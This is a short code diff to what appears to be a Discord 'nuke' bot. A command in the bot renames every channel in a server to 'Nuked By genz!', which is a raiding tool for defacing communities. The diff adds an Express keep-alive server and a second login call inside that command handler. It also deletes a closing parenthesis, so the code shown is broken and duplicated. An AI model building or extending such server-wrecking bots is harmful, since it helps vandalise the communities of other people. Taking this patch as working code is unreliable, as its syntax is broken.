@@ -158,9 +158,21 @@ if (command === "renamechannal") {
     message.guild.channels.cache.map(channel =>
       channel.setName("「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!").catch(() => {})
     )
-  );
+    const express = require("express");
+const app = express();
+
+app.get("/", (req, res) => {
+  res.send("Bot is running!");
+});
+
+app.listen(3000, () => {
+  console.log("Web server running...");
+});
+  
+client.login(process.env.TOKEN);
 
 }
 });
+
 
 client.login(process.env.TOKEN);
